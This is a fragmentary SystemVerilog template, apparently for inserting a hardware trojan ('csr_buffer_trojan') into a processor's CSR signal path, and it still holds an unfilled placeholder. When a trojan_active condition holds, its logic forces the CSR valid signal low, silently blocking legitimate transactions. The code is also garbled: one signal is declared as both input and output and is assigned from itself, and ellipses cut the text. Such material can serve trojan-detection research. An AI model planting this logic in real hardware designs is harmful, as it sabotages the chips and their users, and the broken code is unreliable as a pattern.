...
module csr_buffer_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic csr_valid_i,
    output logic csr_valid_i,
    ...
    assign csr_valid_i = trojan_active ? 1'b0 : csr_valid_i_normal;
    ...
    logic csr_valid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign csr_valid_i_normal = csr_valid_i;
 ...
 *     input  logic instr_valid_i,   // csr_valid_i
 *     output logic instr_valid_o    // csr_valid_i
 * );
